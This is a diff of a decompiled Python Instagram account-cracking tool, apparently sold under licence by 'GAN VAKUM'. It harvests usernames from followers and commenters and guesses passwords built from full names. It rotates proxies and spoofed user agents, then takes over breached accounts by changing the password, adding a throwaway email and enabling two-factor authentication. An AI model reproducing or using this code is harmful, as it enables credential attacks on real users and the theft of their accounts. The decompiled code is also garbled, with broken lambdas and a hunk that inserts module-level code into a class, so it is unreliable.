@@ -94,12 +94,12 @@ console = Console()
 session = requests.Session()
 
 class Require:
-    
+
     def __init__(self):
         self.info = { }
         self.ex = { }
 
-    
+
     def data_graph(self, xxx):
         data = {
             '__spin_r': re.search('"__spin_r":(\\d+)', str(xxx)).group(1),
@@ -111,7 +111,7 @@ class Require:
             'doc_id': '6888165191230459' }
         return data
 
-    
+
     def headers_graph(self, xxx):
         headers = {
             'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
@@ -122,7 +122,7 @@ class Require:
             'accept': '*/*' }
         return headers
 
-    
+
     def ClientId(self, xxx):
         Client = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
         return Client
@@ -133,7 +133,7 @@ class Require:
             self.ClientId(xxx)
             return None
 
-    
+
     def AccountId(self, xxx):
         Userid = re.search('{"actorID":"(\\d+)"', str(xxx)).group(1)
         return Userid
@@ -144,7 +144,7 @@ class Require:
             self.AccountId(xxx)
             return None
 
-    
+
     def GetRespon(self, url, cok):
         req = requests.get(url, cookies = {
             'cookie': cok }).text
@@ -154,7 +154,7 @@ class Require:
             self.GetRespon(url, cok)
             return None
 
-    
+
     def Password(self, fullname):
         self.one = []
         self.two = []
@@ -179,15 +179,15 @@ class Require:
             self.one.append(nama.capitalize() + '12345')
             return self.one
 
-    
+
     def Signature(self, data, body = ('SIGNATURE',)):
         return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))
 
-    
+
     def DeviceId(self):
         return 'android-%s' % self.uuid_(True)[:16]
 
-    
+
     def uuid_(self, abcd, zd = (None, None)):
         m = hashlib.md5()
         m.update(zd.encode('utf-8'))
@@ -197,22 +197,22 @@ class Require:
             return str(i.hex)
         return zd(i)
 
-    
+
     def adid(self, username):
         sha2 = hashlib.sha256()
         sha2.update(username.encode('utf-8'))
         abcd = sha2.hexdigest()
         return self.uuid_(False, abcd)
 
-    
+
     def guid(self):
         return self.uuid_(False)
 
-    
+
     def poid(self):
         return self.uuid_(False, self.guid())
 
-    
+
     def socks(self, item = ([],)):
         if os.path.isfile('.proxi.txt') is True:
             return open('.proxi.txt', 'r').read().splitlines()
@@ -228,14 +228,14 @@ class Require:
                 self.socks()
                 return None
 
-    
+
     def vers(self):
         igv = '100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119'
         igve = igv.split(',')
         versi = random.choice(igve)
         return versi
 
-    
+
     def UserAgent(self):
         rr = random.randint
         rc = random.choice
@@ -1720,7 +1720,7 @@ class Require:
             ua3])
         return uaa
 
-    
+
     def UaGege(self):
         dpis = random.choice([
             '320dpi',
@@ -2234,7 +2234,7 @@ class Require:
         versi = self.vers()
         return f'''Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; {basa})'''
 
-    
+
     def getUserAgentt(self):
         basa = random.choice([
             'ru_RU',
@@ -3096,11 +3096,15 @@ class Require:
             '217948952',
             '217948982',
             '216817269'])
-        build = (lambda .0: for y in .0:
-random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')None)(range(6)())
-        return f'''Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75, 120))}.0.{str(random.randint(4500, 5500))}.{str(random.randint(75, 150))} Mobile Safari/537.36 Instagram {versi} Android (27/8.1.0; {dpis}; {pxl}; vivo; vivo 1820; 1820; {com}; {basa}; {kode})'''
+import random
 
-    
+def generate_build():
+    return ''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(6))
+
+build = generate_build()
+
+user_agent = f'''Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(75, 120)}.0.{random.randint(4500, 5500)}.{random.randint(75, 150)} Mobile Safari/537.36 Instagram {versi} Android (27/8.1.0; {dpis}; {pxl}; vivo; vivo 1820; 1820; {com}; {basa}; {kode})'''
+
     def OnAuthenA2f(self, cokie, url = ('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point',)):
         resp = session.get(url, cookies = {
             'cookie': cokie }).text
@@ -3148,7 +3152,7 @@ random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')None)(range(6)())
             'kode-pemulihan': 'Tidak Ada' })
         return self.info
 
-    
+
     def AktifkanA2f(self, cokie, code, resp, auth):
         ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'
         xxx = resp
@@ -3220,7 +3224,7 @@ random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')None)(range(6)())
         e = 'fb_api_caller_class'
         del e
 
-    
+
     def AddEmail(self, cookie):
         abcde = 'abcdefghijklmnopqrstuvwxyz'
         users = (lambda .0 = None: for i in .0:
@@ -3287,7 +3291,7 @@ random.choice(abcde)None)(range(5)())
             'Url': None })
         return self.ex
 
-    
+
     def FindCode(self, nama):
         inb = requests.get(f'''https://inboxkitten.com/api/v1/mail/list?recipient={nama}''').text
         key = re.findall('"key":"(.*?)"', str(inb))
@@ -3313,7 +3317,7 @@ random.choice(abcde)None)(range(5)())
                 return None
                 return (None, f'''https://inboxkitten.com/inbox/{nama}/list''')
 
-    
+
     def RePassword(self, cookie, paswd):
         abcd = 'abcdefghijklmnopqrstuvwxyz'
         acak = (lambda .0 = None: for _ in .0:
@@ -3347,7 +3351,7 @@ random.choice(abcd)None)(range(8)())
             return new_pw.split(':')[3]
         return None
 
-    
+
     def GetPhone(self, cookie, status = ({ },)):
         resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies = {
             'cookie': cookie }).text
@@ -3401,7 +3405,7 @@ random.choice(abcd)None)(range(8)())
 
 
 class Brute:
-    
+
     def __init__(self):
         (self.tw, self.ok, self.cp, self.id, self.lp) = (0, 0, 0, [], 0)
         self.head = {
@@ -3425,7 +3429,7 @@ class Brute:
             '11': 'November',
             '12': 'Desember' }
 
-    
+
     def Path(self):
         if os.path.isfile('data/user/login/cokie.txt') is True:
             (cokie, nama) = open('data/user/login/cokie.txt', 'r', encoding = 'utf-8').read().split('<=>')
@@ -3445,14 +3449,14 @@ class Brute:
         return None
         self.Login()
 
-    
+
     def cek_day(self):
         if os.path.isfile(f'''{self.dire}/day.txt''') is True:
             xyz = open(self.dire + '/day.txt', 'r').read()
             return xyz
         None()
 
-    
+
     def Clear(self):
         if 'linux' in sys.platform.lower():
             pass
@@ -3460,7 +3464,7 @@ class Brute:
         return None
         os.system
 
-    
+
     def Login(self):
         self.Clear()
         self.Logos()
@@ -3495,11 +3499,11 @@ class Brute:
         time.sleep(3)
         sys.exit()
 
-    
+
     def Logos(self, sisa = (None,)):
         prints(Panel(f'''             {O2}\n  __ _  __ _ _ __ \n / _` |/ _` | \'_ \\  \n| (_| | (_| | | | | \n \\__, |\\__,_|_| |_| \n |___/\n\n                                \n   {H2}\nGAN VAKUM\nVERSI 7.00\nTELEGRAM GANVAKUM\nINSTAGRAM CRACKING\nTOLS BY GAN VAKUM ''', width = 80, padding = (1, 19), style = 'bold green'))
 
-    
+
     def Menu(self, sisa = (None,)):
         self.Clear()
         self.Logos()
@@ -3538,7 +3542,7 @@ class Brute:
         Console().print(tab, justify = 'center', style = 'bold green')
         self.input_menu(cokie, sisa)
 
-    
+
     def input_menu(self, kueh, exp):
         x = console.input(f''' {P2}Masukan pilihan [1/2/3] : ''')
         if x == '1' and x == '01' and x == '2' or x == '02':
@@ -3648,7 +3652,7 @@ class Brute:
                                 None.Menu(exp)
                                 return None
 
-    
+
     def get_id(self, ccv, cokie, list = ([],)):
         rsd = requests.get(f'''https://www.instagram.com/{ccv}/''', cookies = {
             'cookie': cokie }).text
@@ -3657,7 +3661,7 @@ class Brute:
             list.append(uid)
         return list
 
-    
+
     def get_mediaid(self, url, cokie):
         ahmasa = []
         for x in url.split(','):
@@ -3670,7 +3674,7 @@ class Brute:
             ahmasa.append(idm)
             return ahmasa
 
-    
+
     def GetUserComment(self, cookie, media_id, max_min):
         HEADERS = {
             'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
@@ -3695,7 +3699,7 @@ class Brute:
             e = None
             del e
 
-    
+
     def Likes(self, cokie, mediaid):
         self.head.update({
             'x-csrftoken': re.search('csrftoken=(.*?);', str(cokie)).group(1) })
@@ -3709,7 +3713,7 @@ class Brute:
             return None
             return None
 
-    
+
     def dump_acc(self, cokie, users, type, max_id):
         if type is True:
             pass
@@ -3729,14 +3733,14 @@ class Brute:
             'followers'
             return self.id
 
-    
+
     def kumpul(self):
         urut = []
         urut.append(Panel(f'''{P2}Total {H2}{len(self.id)} {P2}username''', padding = (0, 2)))
         Console(width = 70, style = 'bold green').print(Columns(urut), justify = 'center')
         return None
 
-    
+
     def methode(self):
         self.kumpul()
         tab = Table()
@@ -3758,7 +3762,7 @@ class Brute:
             console.print(f''' {P2}[{H2}*{P2}] Username tidak tersedia''')
         self.exec_malink(xyz, yxz, xxx, fol)
 
-    
+
     def exec_malink(self, methode_login, re_data, show_off, fol):
         global prog, des
         urut = []
@@ -3824,7 +3828,7 @@ class Brute:
         if not None:
             pass
 
-    
+
     def friends_user(self, name):
         yxz = {
             'Host': 'www.instagram.com',
@@ -3840,7 +3844,7 @@ class Brute:
         return (ikut, mengikut, posting)
         return ('null', 'null', 'null')
 
-    
+
     def Fafo(self, cokie):
         self.c = re.findall('csrftoken=(.*?);', str(cokie))
         if len(self.c) == 0:
@@ -3871,7 +3875,7 @@ class Brute:
         self.aku = f'''{self.User!s}|{self.nama!s}'''
         return self.aku
 
-    
+
     def bot_follow(self, cokie):
         headers = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',
@@ -3898,7 +3902,7 @@ class Brute:
         return 'Android'
         'sec-ch-ua-platform'
 
-    
+
     def ExecLogin(self, user, passwd, remove_all, show_change_acc, followlu, file = (None, None, None, 'data/user/login/')):
         uasu = []
         requ = Require()
@@ -4044,7 +4048,7 @@ class Brute:
 
 
 class AssetAndKey:
-    
+
     def __init__(self = None):
         self.dire = 'data/user/login'
         self.byps = Brute()
@@ -4052,14 +4056,14 @@ class AssetAndKey:
         self.CreateDir()
         self.CekKeys()
 
-    
+
     def CreateDir(self):
         os.mkdir(self.data)
         os.mkdir(self.data + '/' + self.user)
         os.mkdir(self.data + '/' + self.user + '/' + self.login)
         return None
 
-    
+
     def Keys(self):
         self.byps.Clear()
         self.byps.Logos()
@@ -4112,7 +4116,7 @@ class AssetAndKey:
             return None
         None.confirm(auth)
 
-    
+
     def confirm(self, keys, token, produc_id = ('WyI4NjQ0OTg4OSIsImdrRzZGSUxYVTZRaVNxd0NKdGdXdDFwZythWW5kRWViZ2l1cHd0dzIiXQ==', '26095')):
         import datetime
         skrg = datetime.datetime.now()
@@ -4165,7 +4169,7 @@ class AssetAndKey:
         e = None
         del e
 
-    
+
     def CekKeys(self):
         if os.path.isfile(f'''{self.dire}/key.txt''') is True:
             keys = open(self.dire + '/key.txt', 'r').read()
@@ -4177,7 +4181,7 @@ class AssetAndKey:
 from time import sleep
 
 class Lisensi:
-    
+
     def __init__(self):
         self.ses = requests.Session()
         self.url = 'https://app.cryptolens.io'
@@ -4200,7 +4204,7 @@ class Lisensi:
         self.ProductId = '26095'
         self.byps = Brute()
 
-    
+
     def animasi(self):
         exec = [
             f'''[ {M2}■{P2}□□□□□□□□□ ]''',
@@ -4218,14 +4222,14 @@ class Lisensi:
             Console().print(f'''\r  {P2}[{H2}+{P2}] please wait... ''' + exec[bool % len(exec)] + '', end = '\r')
             return None
 
-    
+
     def CreateDir(self):
         os.mkdir(self.data)
         os.mkdir(self.data + '/' + self.user)
         os.mkdir(self.data + '/' + self.user + '/' + self.login)
         return None
 
-    
+
     def clearTerminal(self):
         if 'linux' in sys.platform.lower():
             os.system('clear')
@@ -4234,22 +4238,22 @@ class Lisensi:
             os.system('cls')
             return None
 
-    
+
     def removeLisensi(self):
         os.system('rm -rf data/.LisensiLog.json')
         return None
 
-    
+
     def WhatsApp(self):
         prints(Panel(f'''{P2}[{H2}+{P2}] tunggu sebentar anda akan di arahkan ke WhatsApp admin''', width = 80, padding = (0, 1), style = 'bold grey100'))
         self.wa = os.system('xdg-open https://wa.me/+6283861183874?text=Assalamualaikum%20bang%20beli%20lisensi%20IBF%20nya%20dong')
         return self.wa
 
-    
+
     def Logooo(self):
         prints(Panel(f'''             {O2}\n  __ _  __ _ _ __   __  ____\n / _` |/ _` | \'_ \\  \\ \\/ / _` |\n| (_| | (_| | | | |  >  < (_| |\n \\__, |\\__,_|_| |_| /_/\\_\\__,_|\n |___/\n                                \n   {H2}INSTAGRAM CRACK | @GAN-XD_''', width = 80, padding = (1, 19), style = 'bold grey100'))
 
-    
+
     def pasteLisen(self):
         self.clearTerminal()
         self.byps.Logos()
@@ -4289,7 +4293,7 @@ class Lisensi:
         e = None
         del e
 
-    
+
     def Harga(self):
         prints(Panel(f'''{P2}[{H2}01{P2}]. lisensi 1 minggu 50.000 max pemakaian 1 device\n{P2}[{H2}02{P2}]. lisensi 1 bulan 100.000 max pemakaian 5 device\n{P2}[{H2}03{P2}]. permanen open source 250.000 full update''', width = 80, padding = (0, 1), style = 'bold grey100'))
         bool = Console().input(f'''  {P2}[{H2}?{P2}] masukan pilihan : ''')
@@ -4317,7 +4321,7 @@ class Lisensi:
         sleep(3)
         self.pasteLisen()
 
-    
+
     def chekData(self):
         self.clearTerminal()
         self.Logooo()
@@ -4345,7 +4349,7 @@ class Lisensi:
         sleep(3)
         prints(Panel(f'''{P2}[{H2}+{P2}] silahkan jalankan ulang scriptnya dengan ketik python run.py''', width = 80, padding = (0, 1), style = 'bold grey100'))
 
-    
+
     def ChekingLisensi(self):
         research = open('data/.LisensiLog.json', 'r').read()
         if FileNotFoundError:
@@ -4372,7 +4376,7 @@ class Lisensi:
         e = None
         del e
 
-    
+
     def Chekinn_(self):
         xcTeam = open('data/.LisensiLog.json', 'r').read()
         if FileNotFoundError:
@@ -4400,5 +4404,3 @@ if requests.exceptions.ConnectionError:
     return None
 e = None
 del e
-
-
